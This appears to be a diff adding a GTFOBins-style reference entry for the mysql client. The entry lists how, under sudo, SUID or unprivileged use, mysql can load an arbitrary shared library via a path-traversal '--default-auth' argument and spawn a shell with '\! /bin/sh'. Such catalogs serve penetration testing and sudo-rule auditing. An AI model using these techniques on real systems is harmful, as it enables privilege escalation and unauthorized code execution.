@@ -1,0 +1,29 @@
+mysql
+=====
+
+Library load
+------------
+
+[Sudo]
+    mysql --default-auth ../../../../../path/to/lib
+    The following loads the `/path/to/lib.so` shared object.
+
+[SUID]
+    mysql --default-auth ../../../../../path/to/lib
+    The following loads the `/path/to/lib.so` shared object.
+
+[Unprivileged]
+    mysql --default-auth ../../../../../path/to/lib
+    The following loads the `/path/to/lib.so` shared object.
+
+Shell
+-----
+
+[Sudo]
+    mysql -e '\! /bin/sh'
+
+[SUID]
+    mysql -e '\! /bin/sh'
+
+[Unprivileged]
+    mysql -e '\! /bin/sh'
